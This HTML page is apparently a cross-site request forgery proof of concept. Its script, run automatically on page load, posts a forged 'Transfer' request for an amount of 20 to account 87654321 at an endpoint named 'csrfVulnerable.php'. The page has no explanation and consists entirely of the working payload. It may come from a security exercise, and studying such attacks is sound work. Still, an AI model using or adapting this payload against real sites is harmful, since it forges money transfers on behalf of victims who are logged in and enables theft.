<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
    $.post("https://sencldigitech.co.uk/faziz/website/csrfVulnerable.php", {
        amount: '20',
        targetAccount: 87654321,
        submit: 'Transfer'
    }, function(response) {
        console.log("Response: " + response); // Optional: For debugging the response
    });
</script>
</body>
</html>
